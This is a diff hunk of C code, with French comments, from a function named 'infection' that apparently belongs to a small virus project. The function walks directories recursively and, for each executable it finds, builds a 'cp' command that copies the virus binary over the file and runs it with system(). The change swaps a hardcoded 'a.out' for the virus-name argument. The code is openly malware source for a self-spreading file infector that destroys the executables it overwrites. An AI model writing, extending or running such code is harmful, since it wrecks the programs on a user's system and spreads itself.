@@ -20,9 +20,8 @@ void infection(int profondeur, char chemin[], char virus[64]){
 				infection(profondeur+1, nouveau_chemin, virus);
 			}else if (stat(nouveau_chemin, &sb) == 0 && sb.st_mode & S_IXUSR){
 				if(profondeur==0 && strcmp(virus,liste[j]->d_name) || profondeur!=0){
-					char commande[128]="cp ";
-					strcat(commande,"a.out ");//On remplace a.out par le nom du virus
-					strcat(commande, nouveau_chemin);
+					char commande[569];
+					snprintf(commande, 569, "cp %s %s",virus, nouveau_chemin);
 					system(commande);										
 				}
 			}
